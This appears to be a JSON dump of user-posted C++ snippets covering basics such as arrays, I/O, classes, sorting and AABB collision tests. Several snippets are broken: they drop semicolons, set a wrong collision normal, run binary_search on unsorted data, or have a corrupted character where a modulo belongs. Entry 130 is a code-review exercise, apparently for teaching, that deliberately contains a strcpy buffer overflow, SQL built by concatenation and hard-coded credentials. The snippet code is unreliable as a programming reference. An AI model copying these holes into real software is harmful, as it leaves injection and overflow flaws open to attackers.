    "description": "CC=gcc CXX=g++ RM=rm -f CPPFLAGS=-g $(shell root-config --cflags) LDFLAGS=-g $(shell root-config --ldflags) LDLIBS=$(shell root-config --libs)  SRCS=tool.cc support.cc OBJS=$(subst .cc,.o,$(SRCS))  all: tool  tool: $(OBJS)     $(CXX) $(LDFLAGS) -o tool $(OBJS) $(LDLIBS)  tool.o: tool.cc support.hh  support.o: support.hh support.cc  clean:     $(RM) $(OBJS)  distclean: clean     $(RM) tool \nCC=gcc CXX=g++ RM=rm -f CPPFLAGS=-g $(shell root-config --cflags) LDFLAGS=-g $(shell root-config --ldflags) LDLIBS=$(shell root-config --libs)  SRCS=tool.cc support.cc OBJS=$(subst .cc,.o,$(SRCS))  all: tool  tool: $(OBJS)     $(CXX) $(LDFLAGS) -o tool $(OBJS) $(LDLIBS)  tool.o: tool.cc support.hh  support.o: support.hh support.cc  clean:     $(RM) $(OBJS)  distclean: clean     $(RM) tool\nCC=gcc CXX=g++ RM=rm -f CPPFLAGS=-g $(shell root-config --cflags) LDFLAGS=-g $(shell root-config --ldflags) LDLIBS=$(shell root-config --libs)  SRCS=tool.cc support.cc OBJS=$(subst .cc,.o,$(SRCS))  all: tool  tool: $(OBJS)     $(CXX) $(LDFLAGS) -o tool $(OBJS) $(LDLIBS)  tool.o: tool.cc support.hh  support.o: support.hh support.cc  clean:     $(RM) $(OBJS)  distclean: clean     $(RM) tool \n",
    "reg_date": "2021-10-12T11:36:34.000Z"
  },
  {
    "id": 97,
    "keyword": null,
    "link": null,
    "title": " Box and Boc collision C++",
    "description": "bool AABBvsAABB( Manifold *m ) {   // Setup a couple pointers to each object   Object *A = m->A   Object *B = m->B      // Vector from A to B   Vec2 n = B->pos - A->pos      AABB abox = A->aabb   AABB bbox = B->aabb      // Calculate half extents along x axis for each object   float a_extent = (abox.max.x - abox.min.x) / 2   float b_extent = (bbox.max.x - bbox.min.x) / 2      // Calculate overlap on x axis   float x_overlap = a_extent + b_extent - abs( n.x )      // SAT test on x axis   if(x_overlap > 0)   {     // Calculate half extents along x axis for each object     float a_extent = (abox.max.y - abox.min.y) / 2     float b_extent = (bbox.max.y - bbox.min.y) / 2        // Calculate overlap on y axis     float y_overlap = a_extent + b_extent - abs( n.y )        // SAT test on y axis     if(y_overlap > 0)     {       // Find out which axis is axis of least penetration       if(x_overlap > y_overlap)       {         // Point towards B knowing that n points from A to B         if(n.x < 0)           m->normal = Vec2( -1, 0 )         else           m->normal = Vec2( 0, 0 )         m->penetration = x_overlap         return true       }       else       {         // Point toward B knowing that n points from A to B         if(n.y < 0)           m->normal = Vec2( 0, -1 )         else           m->normal = Vec2( 0, 1 )         m->penetration = y_overlap         return true       }     }   } } \n",
    "reg_date": "2021-10-12T11:36:34.000Z"
  },
  {
    "id": 98,
    "keyword": null,
    "link": null,
    "title": " Box and Circle collisions C++",
    "description": "bool AABBvsCircle( Manifold *m ) {   // Setup a couple pointers to each object   Object *A = m->A   Object *B = m->B     // Vector from A to B   Vec2 n = B->pos - A->pos     // Closest point on A to center of B   Vec2 closest = n     // Calculate half extents along each axis   float x_extent = (A->aabb.max.x - A->aabb.min.x) / 2   float y_extent = (A->aabb.max.y - A->aabb.min.y) / 2     // Clamp point to edges of the AABB   closest.x = Clamp( -x_extent, x_extent, closest.x )   closest.y = Clamp( -y_extent, y_extent, closest.y )     bool inside = false     // Circle is inside the AABB, so we need to clamp the circle's center   // to the closest edge   if(n == closest)   {     inside = true       // Find closest axis     if(abs( n.x ) > abs( n.y ))     {       // Clamp to closest extent       if(closest.x > 0)         closest.x = x_extent       else         closest.x = -x_extent     }       // y axis is shorter     else     {       // Clamp to closest extent       if(closest.y > 0)         closest.y = y_extent       else         closest.y = -y_extent     }   }     Vec2 normal = n - closest   real d = normal.LengthSquared( )   real r = B->radius     // Early out of the radius is shorter than distance to closest point and   // Circle not inside the AABB   if(d > r * r && !inside)     return false     // Avoided sqrt until we needed   d = sqrt( d )     // Collision normal needs to be flipped to point outside if circle was   // inside the AABB   if(inside)   {     m->normal = -n     m->penetration = r - d   }   else   {     m->normal = n     m->penetration = r - d   }     return true } \n",
    "reg_date": "2021-10-12T11:36:34.000Z"
  },
  {
    "id": 99,
    "keyword": null,
    "link": null,
    "title": " C++, for-loop over an array array",
    "description": "/*sizeof(array_scores) is a pointer to array_scores[],  and has to be divided by each first-object[0]*/ for(int a = 0; a < sizeof(array_scores)/sizeof(array_scores[0]); a = a + 1 ){ \tcout << \"for loop, a = \" << array_scores[a] << \" at position \" << a << \"\\n\"; } //https://stackoverflow.com/questions/20234898/correct-way-of-looping-through-c-arrays\n",
    "reg_date": "2021-10-12T11:36:34.000Z"
  },
  {
    "id": 100,
    "keyword": null,
    "link": null,
    "title": " C++ Birthday Program",
    "description": "#include <iostream> #include <string>  int main() {      const char dash = '-' ; // expected separator     const int current_year = 2019 ;      int month ;     int day ;     int year ;     char separator ; // to capture the separator between input flds      std::cout << \"Please enter your birth date (mm-dd-yyyy): \" ;      if( std::cin >> month && month > 0 && month < 13 && // valid month [1,12]         std::cin >> separator && separator == dash && // valid separator         std::cin >> day && day > 0 && day < 32 && // valid day [1,31]         std::cin >> separator && separator == dash && // valid separator         std::cin >> year && year > 1800 && year <= current_year ) // valid year [1800,current_year]     {         // valid input: print name of month (Jan == 1)         const std::string month_names[] = // look up table containing names         {             \"\", // 0 is not used             \"January\", // 1             \"February\", // 2             \"March\",             \"April\",             \"May\",             \"June\",             \"July\",             \"August\",             \"September\",             \"October\",             \"November\",             \"December\" // 12         };          std::cout << \"your birth day is in the month of \" << month_names[month] << '\\n' ;     }      else std::cout << \"Invalid Date!\\n\" ; }\n",
    "reg_date": "2021-10-12T11:36:34.000Z"
  },
  {
    "id": 101,
    "keyword": null,
    "link": null,
    "title": " C++ C2027",
    "description": "// C2027_b.cpp class A; A& CreateA();  class B; B* CreateB();  int main() {    CreateA();   // C2027    CreateB();   // OK } \n",
    "reg_date": "2021-10-12T11:36:34.000Z"
  },
  {
    "id": 102,
    "keyword": null,
    "link": null,
    "title": " C++ CHEAT SHEAT",
    "description": "#include <future>         // Include future function<int(int)> fib =  // Create lambda function   [&](int i){     if (i <= 1){       return 1;     }     return fib(i-1)           + fib(i-2);   }; future<int> fut =         // result of async function   async(launch::async, fib, 4); // start async function in other thread // do some other work  cout << fut.get();        // get result of async function. Wait if needed.\nint x;                      // Declare x to be an integer (value undefined) int x=255;                  // Declare and initialize x to 255 short s; long l;            // Usually 16 or 32 bit integer (int may be either) char c='a';                 // Usually 8 bit character unsigned char u=255; signed char s=-1;           // char might be either unsigned long x =   0xffffffffL;              // short, int, long are signed float f; double d;          // Single or double precision real (never unsigned) bool b=true;                // true or false, may also use int (1 or 0) \n",
    "reg_date": "2021-10-12T11:36:34.000Z"
  },
  {
    "id": 103,
    "keyword": null,
    "link": null,
    "title": " C++ Character Functions",
    "description": "isdigit() - Check if character is decimal digit  isalpha() - Check if character is alphabetic isblank() - Check if character is blank islower() - Check if character is lowercase letter isupper() - Check if character is uppercase letter isalnum() - Check if character is alphanumeric\n",
    "reg_date": "2021-10-12T11:36:35.000Z"
  },
  {
    "id": 104,
    "keyword": null,
    "link": null,
    "title": " C++ Dynamic allocation Full example",
    "description": "// rememb-o-matic #include <iostream> #include <new> using namespace std;  int main () {   int i,n;   int * p;   cout << \"How many numbers would you like to type? \";   cin >> i;   p= new (nothrow) int[i];   if (p == nullptr)     cout << \"Error: memory could not be allocated\";   else   {     for (n=0; n<i; n++)     {       cout << \"Enter number: \";       cin >> p[n];     }     cout << \"You have entered: \";     for (n=0; n<i; n++)       cout << p[n] << \", \";     delete[] p;   }   return 0; }\n",
    "reg_date": "2021-10-12T11:36:35.000Z"
  },
  {
    "id": 105,
    "keyword": null,
    "link": null,
    "title": " C++ Dynamic allocation failing",
    "description": "int * foo; foo = new (nothrow) int [5]; if (foo == nullptr) {   // error assigning memory. Take measures. }\nfoo = new int [5];  // if allocation fails, an exception is thrown  \nfoo = new (nothrow) int [5]; \n",
    "reg_date": "2021-10-12T11:36:35.000Z"
  },
  {
    "id": 106,
    "keyword": null,
    "link": null,
    "title": " C++ Dynamic allocation in memory",
    "description": "int * foo; foo = new int [5];\n",
    "reg_date": "2021-10-12T11:36:35.000Z"
  },
  {
    "id": 107,
    "keyword": null,
    "link": null,
    "title": " C++ Naive approach for Subarray Sums I in CSES",
    "description": "//ITNOG!//LOUCAS LOUKA!//HACKERS PLEASE DO NOT HACK ME!//GOD PLEASE MAKE ME A BETTER PROGRAMMER THAN THE PROGRAMMER I WAS THE LAST PLANCK TIME!#pragma GCC optimize (\"Ofast\")#pragma GCC optimize (\"unroll-loops\")#include <bits/stdc++.h>using namespace std;typedef long long int lli;typedef vector<lli> Vlli;lli SOLVE(Vlli A,lli N,lli M){    lli FI = 0,SI = 0,SUM = 0,CNT = 0;    for (;SI<N;)    {        if (SUM==M)        {            ++CNT;            ++SI;            SUM = 0;            FI = SI;        }        else if (SUM>M)        {            SUM = 0;            ++SI;            FI = SI;        }        SUM += A[FI];        ++FI;    }    return CNT;}int main (){    ios_base::sync_with_stdio(false);    cin.tie(NULL);    cout.tie(NULL);    //START    lli N,M;    cin>>N>>M;    Vlli A(N);    for (lli g=0;g<N;++g)        cin>>A[g];    cout<<SOLVE(A,N,M);    //END    exit(0);    return(0);}\n",
    "reg_date": "2021-10-12T11:36:35.000Z"
  },
  {
    "id": 108,
    "keyword": null,
    "link": null,
    "title": " C++ RPG game",
    "description": "#This is not a tutorial...  #I hope C++ can be your favorite programming language #C++ was the first programming language I learned and it was easy and fun! #You can do it!\n",
    "reg_date": "2021-10-12T11:36:35.000Z"
  },
  {
    "id": 109,
    "keyword": null,
    "link": null,
    "title": " C++ Split String By Space into Vector",
    "description": "string s, tmp;  stringstream ss(s); vector<string> words;  // If there is one element (so komma) then push the whole string if(getline(ss, tmp, ',').fail()) {   words.push_back(s); } while(getline(ss, tmp, ',')){     words.push_back(tmp); } \nstd::string s = \"What is the right way to split a string into a vector of strings\"; std::stringstream ss(s); std::istream_iterator<std::string> begin(ss); std::istream_iterator<std::string> end; std::vector<std::string> vstrings(begin, end); std::copy(vstrings.begin(), vstrings.end(), std::ostream_iterator<std::string>(std::cout, \"\\n\")); \n",
    "reg_date": "2021-10-12T11:36:35.000Z"
  },
  {
    "id": 110,
    "keyword": null,
    "link": null,
    "title": " C++ Syntax",
    "description": "#include<iostream> using namespace std; int main() { \tsystem(\"pause\"); //To pause the screen   \treturn 0; //Not neccessary }\n#include <iostream>  int main() {   std::cout << \"Hello World!\";   return 0; }\n",
    "reg_date": "2021-10-12T11:36:35.000Z"
  },
  {
    "id": 111,
    "keyword": null,
    "link": null,
    "title": " C++ Variable",
    "description": "std::string str = \"text\";\t// stores a string int    foo = 3;\t\t\t\t// stores any integer float  bar = 3.14;\t\t\t// stores 32 bit number double baz = 3.14159265;\t// stores 64 bit number\n#include <iostream> using namespace std; int main(){ \t int number = 1;               double decimal = 6.9;     char characterx = 'i';    string text =\"Sup\";      bool boolean = true;        return 0; }\n#include <iostream>  using namespace std    int main{ \tint x = 3;     float g = 4.0;     long h = 1234567;     double j = 1237886.099;     cout<<x<<endl;     cout<<h<<endl;     cout<<g<<endl;     cout<<j<<endl; }\nCreate a variable called myNum of type int and assign it the value 15:   int myNum = 15; cout << myNum; \n#include <iostream> using namespace std;  int main() { // To define variables in C++, you have to specify the data type. Example: int number = 10; // Declares a variable with the integer data type. float decimal = 3.5;  // Declares a variable with the float data type. double decimalNum = 3.3333; // Doubles are used for more specific points in floats. string text = \"Hello World\";  // Declares a variable with the string data type. bool result = true;  // Declares a variable with the boolean data type.    }\n",
    "reg_date": "2021-10-12T11:36:35.000Z"
  },
  {
    "id": 112,
    "keyword": null,
    "link": null,
    "title": " C++ Vector clear syntax",
    "description": "vector<T>().swap(x);   // clear x reallocating \n",
    "reg_date": "2021-10-12T11:36:35.000Z"
  },
  {
    "id": 113,
    "keyword": null,
    "link": null,
    "title": " C++ Vector swap syntax",
    "description": "vector<T>().swap(x);   // clear x reallocating \n",
    "reg_date": "2021-10-12T11:36:36.000Z"
  },
  {
    "id": 114,
    "keyword": null,
    "link": null,
    "title": " C++ accessing in priority queue",
    "description": "/* Program to access an element of highest priority */   #include<iostream> #include<queue>     //Header-file for queue using namespace std;     int main() { priority_queue<int> p1; p1.push(35);     p1.push(40); p1.push(95); p1.push(25);    cout<<p1.top();      //fetch element of highest priority(maximum element) i.e 95 } \n",
    "reg_date": "2021-10-12T11:36:36.000Z"
  },
  {
    "id": 115,
    "keyword": null,
    "link": null,
    "title": " C++ and endl",
    "description": "// endl example #include <iostream>     // std::cout, std::end using namespace std; int main () {    int a=100;   double b=3.14;    cout << a;   cout << endl;              // manipulator inserted alone   cout << b << endl << a*b;  // manipulator in concatenated insertion   endl (cout);               // endl called as a regular function    return 0; }\n",
    "reg_date": "2021-10-12T11:36:36.000Z"
  },
  {
    "id": 116,
    "keyword": null,
    "link": null,
    "title": " C++ append into empy array",
    "description": "#include <iostream> #include <cmath> using namespace std; void Shop(int);  int Gold = 10;  int HealthPotion = 0; int ManaPotion = 0;  int Choice; string Inventory[5];   int main(){    cout << \"You are in the shop. What would you like to buy?\"; cout << \" You have \" << Gold << \" gold.\"; cout << endl; cout << \"1\\) Health potion: 2 gold.  2\\) Mana Potion: 3 gold.\"; cin >> Choice; Shop(Choice);  cin.ignore(); cin.get(); return 0; }  void Shop(int x){  if(x==1){    HealthPotion++;    Gold = Gold-2;    }  if(x==2){    ManaPotion++;    Gold = Gold-3;    }  }\n",
    "reg_date": "2021-10-12T11:36:36.000Z"
  },
  {
    "id": 117,
    "keyword": null,
    "link": null,
    "title": " C++ array find method",
    "description": "#include <iostream> #include <algorithm> #include <array> using namespace std;  int main() {     array<int, 5> arrayfind{ 3,4,1,2,5 };     int Finding = 2;//an element to find     bool Founded;      Founded = binary_search(arrayfind.begin(), arrayfind.end(), Finding);     //if the element that you're looking for is in the array,     //bool Founded will be true     if (Founded == true) {         cout << Finding << \" Is in the array!\";     }     else {         cout << Finding << \" Is not in the array!\";     } }\n",
    "reg_date": "2021-10-12T11:36:36.000Z"
  },
  {
    "id": 118,
    "keyword": null,
    "link": null,
    "title": " C++ array sort method",
    "description": "#include <bits/stdc++.h>  using namespace std;   #define size(arr) sizeof(arr)/sizeof(arr[0]);   int main(){      int a[5] = {5, 2, 6,3 ,5};     int n = size(a);     sort((a), a + n);     for(int i = 0; i < n; i++){         cout << a[i];     }       return 0;  } \n#include <iostream> using namespace std;  #define MAX 100  int main() { \t//array declaration \tint arr[MAX]; \tint n,i,j; \tint temp; \t \t//read total number of elements to read \tcout<<\"Enter total number of elements to read: \"; \tcin>>n; \t \t//check bound \tif(n<0 || n>MAX) \t{ \t\tcout<<\"Input valid range!!!\"<<endl; \t\treturn -1; \t} \t \t//read n elements \tfor(i=0;i<n;i++) \t{ \t\tcout<<\"Enter element [\"<<i+1<<\"] \"; \t\tcin>>arr[i]; \t} \t \t//print input elements \tcout<<\"Unsorted Array elements:\"<<endl; \tfor(i=0;i<n;i++) \t\tcout<<arr[i]<<\"\\t\"; \tcout<<endl; \t \t//sorting - ASCENDING ORDER \tfor(i=0;i<n;i++) \t{\t\t \t\tfor(j=i+1;j<n;j++) \t\t{ \t\t\tif(arr[i]>arr[j]) \t\t\t{ \t\t\t\ttemp  =arr[i]; \t\t\t\tarr[i]=arr[j]; \t\t\t\tarr[j]=temp; \t\t\t} \t\t} \t} \t \t//print sorted array elements \tcout<<\"Sorted (Ascending Order) Array elements:\"<<endl; \tfor(i=0;i<n;i++) \t\tcout<<arr[i]<<\"\\t\"; \tcout<<endl;\t \t \t \treturn 0; \t } \nsort(arr, arr+length); //increase sort(arr, arr+length, greater<int>()); //decrease \n#include <algorithm> #include <iostream> #include <array> using namespace std;  int main() {     array<int, 5> arraysort{ 4,2,3,5,1 };     sort(arraysort.begin(), arraysort.end());     for (int i = 0; i < arraysort.size(); i++) {         cout << arraysort[i] << \" \";     } \treturn 0;  }\n#include<bits/stdc++.h>  vector<int> v = { 6,1,4,5,2,3,0}; sort(v.begin() , v.end()); // {0,1,2,3,4,5,6} sorts ascending sort(v.begin(), v.end(), greater<int>()); // {6,5,4,3,2,1,0} sorts descending\n#include <iostream> 2 #include <array> 3 #include <string> 4 #include <algorithm> 5 6 using namespace std; 7 8 int main(){ 9 array<string, 4> colours = {\"blue\", \"black\", \"red\", \"green\"}; 10 for (string colour : colours){ 11 cout << colour << ' '; 12 } 13 cout << endl; 14 sort(colours.begin(), colours.end()); 15 for (string colour : colours){ 16 cout << colour << ' '; 17 } 18 return 0; 19 } 66 20 21 /* 22 Output: 23 blue black red green 24 black blue green red 25 */\n",
    "reg_date": "2021-10-12T11:36:36.000Z"
  },
  {
    "id": 119,
    "keyword": null,
    "link": null,
    "title": " C++ cin cout",
    "description": "//it_start and it_end are the start and end iterators of your container //(ie. vec.begin() and vec.end()) //T is the type of your container (for example, for a std::vector<int> then //T is int) //separator is a string that will be inserted between each element  std::copy(it_start, it_end, std::ostream_iterator<T>(std::cout, separator));\ncout << \"Hello World!\";\nint age; cout << \"How old are you ?\" << endl; cin >> age;\n//Akbarali saqlagan C++ bo'yicha cin operatoriga ta'rif #include <iostream> using namespace std; int main (){   int a;   cout << \"Kattaroq sonni yozing: \";   cin >> a;   int b;   cout << \"Tepadaginga nisbatan kichik bo`lgan son(qiymatni) yozing: \";   cin >> b;   cout << \"Birinchi kiritgan soningizdan ikkinchi kiitgan soningiz \" << a-b << \" marta katta ekanligi ma'lum bo'ldi.\\n\";   return 0; }\nstd::cout << \"Hello World!\" << std::endl; //Or you can do std::cout << \"Hello World!\" <<; //Only in some scenarios \n// It prints output on the screen std::cout << \"C++ Programming\" << endl;\n",
    "reg_date": "2021-10-12T11:36:36.000Z"
  },
  {
    "id": 120,
    "keyword": null,
    "link": null,
    "title": " C++ class",
    "description": "#include <iostream>      using namespace std;  class Foo  {    public:    Foo ( )    {       cout << \"constructor Foo\\n\";    }                };  class Bar  {    public:    Bar ( Foo )    {       cout << \"constructor Bar\\n\";    } };  int main() {    /* 1 */ Foo* foo1 = new Foo ();    /* 2 */ Foo* foo2 = new Foo;    /* 3 */ Foo foo3;    /* 4 */ Foo foo4 = Foo::Foo();     /* 5 */ Bar* bar1 = new Bar ( *new Foo() );    /* 6 */ Bar* bar2 = new Bar ( *new Foo );    /* 7 */ Bar* bar3 = new Bar ( Foo foo5 );    /* 8 */ Bar* bar3 = new Bar ( Foo::Foo() );     return 1; } \nclass Rectangle  { \tint width, height; public: \tvoid set_values (int,int);     int area() {return width*height;} };  void Rectangle::set_values (int x, int y) { \twidth = x; \theight = y; }\nclass Exemple {   private:   \t/* data */   public:   \tExemple(); //Constructor   \t~Exemple(); //Destructor };\n#include <iostream>  using namespace std;  class Box {    public:       double length;         // Length of a box       double breadth;        // Breadth of a box       double height;         // Height of a box        // Member functions declaration       double getVolume(void);       void setLength( double len );       void setBreadth( double bre );       void setHeight( double hei ); };  // Member functions definitions double Box::getVolume(void) {    return length * breadth * height; }  void Box::setLength( double len ) {    length = len; } void Box::setBreadth( double bre ) {    breadth = bre; } void Box::setHeight( double hei ) {    height = hei; }  // Main function for the program int main() {    Box Box1;                // Declare Box1 of type Box    Box Box2;                // Declare Box2 of type Box    double volume = 0.0;     // Store the volume of a box here      // box 1 specification    Box1.setLength(6.0);     Box1.setBreadth(7.0);     Box1.setHeight(5.0);     // box 2 specification    Box2.setLength(12.0);     Box2.setBreadth(13.0);     Box2.setHeight(10.0);     // volume of box 1    volume = Box1.getVolume();    cout << \"Volume of Box1 : \" << volume <<endl;     // volume of box 2    volume = Box2.getVolume();    cout << \"Volume of Box2 : \" << volume <<endl;    return 0; }\nclass Personnage {      }; // N'oubliez pas le point-virgule &agrave; la fin ! \n   class MyClass {          // The class   public:                // Access specifier     int myNum;        //    Attribute (int variable)     string myString;  //    Attribute (string variable) };    \n",
    "reg_date": "2021-10-12T11:36:36.000Z"
  },
  {
    "id": 121,
    "keyword": null,
    "link": null,
    "title": " C++ const cast",
    "description": "// const_cast #include <iostream> using namespace std;  void print (char * str) {   cout << str << '\\n'; }  int main () {   const char * c = \"sample text\";   print ( const_cast< char *>(c) );   return 0; }   // const_cast #include <iostream>  using namespace std;   int fun(int* ptr)  {  \treturn (*ptr + 10);  }   int main(void)  {  \tconst int val = 10;  \tconst int *ptr = &val;  \tint *ptr1 = const_cast<int *>(ptr);  \tcout << fun(ptr1);  \treturn 0;  } \n",
    "reg_date": "2021-10-12T11:36:37.000Z"
  },
  {
    "id": 122,
    "keyword": null,
    "link": null,
    "title": " C++ convert integer to digits, as vector",
    "description": "// Convert integer to vector of digits vector<int> int_to_vector(long long n) {      vector<int> vec;     while (n != 0) {         vec.push_back(n\u0010);         n /= 10;     }     reverse(vec.begin(), vec.end());     return vec; }\n",
    "reg_date": "2021-10-12T11:36:37.000Z"
  },
  {
    "id": 123,
    "keyword": null,
    "link": null,
    "title": " C++ convert vector of digits into integer",
    "description": "// Convert integer to vector of digits vector<int> int_to_vector(long long n) {      vector<int> vec;     while (n != 0) {         vec.push_back(n\u0010);         n /= 10;     }     reverse(vec.begin(), vec.end());     return vec; }\n// Convert vector of digits to integer long long vector_to_int(vector<int> num) {      long long n = 0;     int N = num.size();     for (int i = 0; i < N; i++) {         n += num[i]*pow(10, N-i-1);     }     return n; }\n",
    "reg_date": "2021-10-12T11:36:37.000Z"
  },
  {
    "id": 124,
    "keyword": null,
    "link": null,
    "title": " C++ cout iostream",
    "description": "#include <iostream> // for std::cout  //std::cout outputs Strings, numbers and variables to the commandline int main() {   \tint x = 1     std::cout << \"Hello\" << \" world!\\n\" << x;    \t/* \toutputs: Hello world! \t\t1 \t\t\t\t\t\t*/ ////////////////////////////////////////////////////////////////////////////////////  \t   \t// cout does not make a new line for each call   \tstd::cout << \"The answere: \";   \tstd::cout << 42;   \t/* \toutputs: The answere: 42 */ ///////////////////////////////////////////////////////////////////////////////////     \t// std::endl and \\n are both newlines   \t// std::endl adds a newline and makes sure the text gets displayed immediately   \t// \"\\n\" adds a newline.(cout makes it display immediately by default)    \tstd::cout << \"step1\" << std::endl       \t\t  << \"step2\" << '\\n'       \t\t  << \"end\"; \t/*\toutputs: step1     \t\t\t step2                  end */ //////////////////////////////////////////////////////////////////////////////////     return 0; }  //The operator << gets overloaded by iostream to change its usage to what you see above\n",
    "reg_date": "2021-10-12T11:36:37.000Z"
  },
  {
    "id": 125,
    "keyword": null,
    "link": null,
    "title": " C++ create file mapping object",
    "description": "#include <Windows.h> #include <tchar.h>  int main() {   \t/*     \tThis creates a file mapping object that can only READ the file         see: https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea     */    \tHANDLE fileHandle = CreateFile(         _T(\"combatlog.txt\"),         GENERIC_READ,         FILE_SHARE_READ,         NULL,         OPEN_EXISTING,         FILE_ATTRIBUTE_NORMAL,         NULL     ); }\n",
    "reg_date": "2021-10-12T11:36:37.000Z"
  },
  {
    "id": 126,
    "keyword": null,
    "link": null,
    "title": " C++ declar array",
    "description": "int foo [5];\n",
    "reg_date": "2021-10-12T11:36:37.000Z"
  },
  {
    "id": 127,
    "keyword": null,
    "link": null,
    "title": " C++ drop last element of list",
    "description": "  std::string res;  // sample // do things   if (res.size() > 0 ) res.pop_back();   return res;  // typical next instruction // alternative   return res.substr(0, res.size() - 1);\n",
    "reg_date": "2021-10-12T11:36:37.000Z"
  },
  {
    "id": 128,
    "keyword": null,
    "link": null,
    "title": " C++ example of if else",
    "description": "   int myAge = 35; cout << \"I am \" << myAge << \" years old.\"; \n",
    "reg_date": "2021-10-12T11:36:37.000Z"
  },
  {
    "id": 129,
    "keyword": null,
    "link": null,
    "title": " C++ expected a ')'",
    "description": "  #include <iostream> #include <cstdlib>                #include <math.h>   using namespace std;  #define vesszo \",\" #define szokoz \" \"  int main() { \tsystem(\"cls\"); \tdouble a, b, c;  \tcout << \"1.oldal: \"; \tcin >> a; \tcout << \"2.oldal: \"; \tcin >> b; \tcout << \"3.oldal: \"; \tcin >> c;  \tcout << \"A haromszog oldalai: \" << a << vesszo << szokoz << b << vesszo << szokoz << c << \"\\n\";   \tbool szekhet = false;  \tif ((a + b > c) and(a + c > b) and(b + c > a));  }\n",
    "reg_date": "2021-10-12T11:36:37.000Z"
  },
  {
    "id": 130,
    "keyword": null,
    "link": null,
    "title": " C++ file .",
    "description": "// basic file operations #include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"example.txt\");   myfile << \"Writing this to a file.\\n\";   myfile.close();   return 0; }\n#include <stdio.h> #include <stdlib.h> #include <string> #include <iostream>  /* Premise:  We have a top secret file that only authorized users are allowed to download, and they need a CLI tool for retrieving it. We tasked a developer with building the server and client for this. He built the client first, and has sent you his code for review.  What feedback, questions, or concerns would you give the developer after reviewing his client.  */ bool userIsFound(std::string query) {   // Pretend this method actually executes an SQL query instead of always returning true   return true; }  void fetchHttpFile(std::string url) {   // Pretend the code for this lives somewhere else }  int main (int argc, char* argv[]) {   char username[20];   char password[20];   strcpy(username, argv[1]);   strcpy(password, argv[2]);    std::string query = \"SELECT * FROM users WHERE username=\" + std::string(username) + \" AND password=\" + std::string(password);   std::string url = \"http://secretuser:secretpassword@www.example.com/secretfile\";    if (userIsFound(query)) {     fetchHttpFile(url);     std::cout << \"Downloading file: \" + url;     exit (EXIT_SUCCESS);   }   else   {     std::cout << \"Error downloading file: \" + url + \" You do not have permission.\";     exit (EXIT_FAILURE);   } }\n",
    "reg_date": "2021-10-12T11:36:37.000Z"
  },
  {
    "id": 131,
    "keyword": null,
    "link": null,
    "title": " C++ fill string with random uppercase letters",
    "description": "#include <string>  using namespace std;  string CreateRandomChars(std::size_t ItemCount) {     string str;      for(unsigned i=0;i<ItemCount;++i)        str.push_back((rand() % 26) + 'A');     return str; }\n",
    "reg_date": "2021-10-12T11:36:37.000Z"
  },
  {
    "id": 132,
    "keyword": null,
    "link": null,
    "title": " C++ generate a random letter",
    "description": "#include <iostream>  int main() {     srand(time(0));     std::cout <<\"random uppercase = \" << char('A' + rand() % 26) << std::endl;     // or     std::cout <<\"random uppercase = \" << char('a' + rand() % 26) << std::endl; }\n",
    "reg_date": "2021-10-12T11:36:38.000Z"
  },
  {
    "id": 133,
    "keyword": null,
    "link": null,
    "title": " C++ if else",
    "description": "   if( a == 10 ) {       cout << \"Value of a is 10\" << endl;    } else if( a == 20 ) {       // if else if condition is true       cout << \"Value of a is 20\" << endl;    } \nif bool then \t--code else \t--code end\n#include<iostream> using namespace std;  int main() {     int grade;      cin >> grade;      if( grade >= 60 )         cout << \"You Pass!\" << endl;     else         cout << \"You Fail...\" << endl;      return 0; } \n#include<iostream> using namespace std;  int main() {     int grade;      cin >> grade;      if( grade >= 60 )     {         cout << \"You Pass!\" << endl;     }     else     {         cout << \"You Fail...\" << endl;     }      return 0; } \n",
    "reg_date": "2021-10-12T11:36:38.000Z"
  },
  {
    "id": 134,
    "keyword": null,
    "link": null,
    "title": " C++ int to char*",
    "description": "// for example you have such integer int i = 3;  // and you want to convert it to a char so that char c = '3';  what you need to do is, by adding i to '0'. The reason why it works is because '0' actually means an integer value of 48. '1'..'9' means 49..57. This is a simple addition to find out corresponding character for an single decimal digit integer:  i.e. char c = '0' + i;  If you know how to convert a single decimal digit int to char, whats left is how you can extract individual digit from a more-than-one-decimal-digit integer  it is simply a simple math by making use of / and %  int i = 123 % 10;  // give u last digit, which is 3 int j = 123 / 10;  // give remove the last digit, which is 12 The logic left is the homework you need to do then. \nstd::string s = std::to_string(number); char const *pchar = s.c_str();  //use char const* as target type\nchar aChar = '0' + i;\n",
    "reg_date": "2021-10-12T11:36:38.000Z"
  },
  {
    "id": 135,
    "keyword": null,
    "link": null,
    "title": " C++ invalid use of 'this' outside of a non-static member function",
    "description": "/**  * your function may not be part of an object  * didn't you forget how to declare a member function?  */ returnType className::function_name(type arg1, type arg2, type argN){ \t//any code }\n",
    "reg_date": "2021-10-12T11:36:38.000Z"
  },
  {
    "id": 136,
    "keyword": null,
    "link": null,
    "title": " C++ is nan",
    "description": "/* isnan example */ #include <stdio.h>      /* printf */ #include <math.h>       /* isnan, sqrt */  int main() {   printf (\"isnan(0.0)       : %d\\n\",isnan(0.0));   printf (\"isnan(1.0/0.0)   : %d\\n\",isnan(1.0/0.0));   printf (\"isnan(-1.0/0.0)  : %d\\n\",isnan(-1.0/0.0));   printf (\"isnan(sqrt(-1.0)): %d\\n\",isnan(sqrt(-1.0)));   return 0; }\ndoubel a = 0 ; bool isnan_a = std::isnan(a) || std::isnan(-a);\n",
    "reg_date": "2021-10-12T11:36:38.000Z"
  },
  {
    "id": 137,
    "keyword": null,
    "link": null,
    "title": " C++ keyboard input",
    "description": "#include <iostream>  // for std::cout and std::cin   int main() {     std::cout << \"Enter a number: \"; // ask user for a number       int x{ }; // define variable x to hold user input (and zero-initialize it)     std::cin >> x; // get number from keyboard and store it in variable x       std::cout << \"You entered \" << x << '\\n';     return 0; }  Enter a number: 4 You entered 4 \n",
    "reg_date": "2021-10-12T11:36:38.000Z"
  },
  {
    "id": 138,
    "keyword": null,
    "link": null,
    "title": " C++ language",
    "description": "C++ is a high-level, general-purpose programming language.  //totally not right there ----------------------------------->\n#include <iostream> using namespace std; class BaseClass { public:    void disp(){       cout<<\"Function of Parent Class\";    } }; class DerivedClass: public BaseClass{ public:    void disp() {       cout<<\"Function of Child Class\";    } }; int main() {    /* Reference of base class pointing to     * the object of child class.     */    BaseClass obj = DerivedClass();     obj.disp();    return 0; }\n   C++ language is a direct descendant of C programming language with  additional features such as type checking, object oriented programming, exception handling etc. It was developed by Bjarne Stroustrup.\n",
